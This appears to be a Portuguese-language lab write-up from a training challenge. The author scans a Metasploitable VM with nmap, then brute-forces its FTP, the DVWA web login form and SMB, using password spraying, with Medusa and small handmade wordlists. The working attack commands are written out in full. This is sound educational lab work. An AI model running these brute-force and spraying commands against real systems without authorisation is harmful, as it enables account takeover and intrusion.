# Desafio-Santander-Dio-CyberSeguranca
Desafio Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux

Primeiramente instalei as 2VMs pelo VirtualBox, em uma rede com faixa de IP diferente da minha principal somente para teste, onde o Kali Linux ficou com o IP 192.168.56.101 e o Metaspoitable com a 192.168.56.102. 
Mas para achar esse IP da Meta, para ficar o mais real possível utilizei a ferramenta nmap com o comando nmap -sn 192.168.56.0/24.

Após encontrar a máquina em questão, continuando com o nmap fiz a busca dos serviços mais utilizados, para fazer a enumeração dos mesmos, foi utilizado o nmap novamente com o comando nmap -sV -p 21,22,80,139,445 192.168.56.102.

Para conseguir acesso a porta, vai ser necessário o ataque de força bruta, já que não temos os usuários e senhas, em forma de aprendizado foi feito um arquivo com os usuários e senhas mais comuns para teste.
Código para criar o arquivo com os usuários echo -e "user\nmsfadmin\nadmin\nroot" > user.txt
Código para criar o arquivo com as senhas echo -e "password\nmsfadmin\nadmin\nroot\nsenha" > password.txt

Agora para iniciarmos a força bruta iremos utilizar o Medusa com o comando
medusa -h 192.168.56.102 -U user.txt -P password.txt -M ftp -t 6

Aqui o medusa informa quando usuário e senha for correto para o login.

Os processos acima foram utilizados para

Agora vamos para fazer um bruteforce no FTP, os passos a seguir são para as tentativas em formulário web utilizando a página de testes DVWA.

Utilizaremos os arquivos já criados anteriormente o user.txt e o password.txt

O comando no medusa para a tentativa de acesso é o seguinte.
medusa -h 192.168.56.102 -U user.txt -P password.txt -M http \
- m PAGE:'/dvwa/login.php' \
- m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
- m'FAIL=Login failed' -t 6

Após o comando o medusa informa quando o primeiro login e senha retorna a informação de sucesso no login.


Vamos iniciar agora os estudos de Password spraying, onde faz com que sejam testadas as senhas padrões / mais faceis em um grande número de usuário. Iremos começar com o comando enum4linux -a 192.168.56.102 | tee enum4_output.txt  
O comando enum4linux é uma ferramenta que é a ferramenta para pegar as informações do sistema windows ou samba no ip, o -a serve para fazer a enumeração completa e o tee faz com que as informações também sejam salvas nesse txt.
Para criar a wordlist dos usuários utilizaremos o comando echo -e "user\nmsfadmin\nservice" > smb_users.txt
Para a criação das senhas é utilizado o comando echo -e "password\n123456\nWelcome123\nmsfadmin" > smb_spray.txt

Para iniciarmos o spray é utilizado o comando medusa -h 192.168.56.102 -U smb_users.txt -P smb_spray.txt -M smbnt -t 2 -T 50

Para testarmos o acesso com a resposta do script acima utilizaremos smbclient -L //192.168.56.102 -U msfadmin 
msfadmin é o login encontrado.




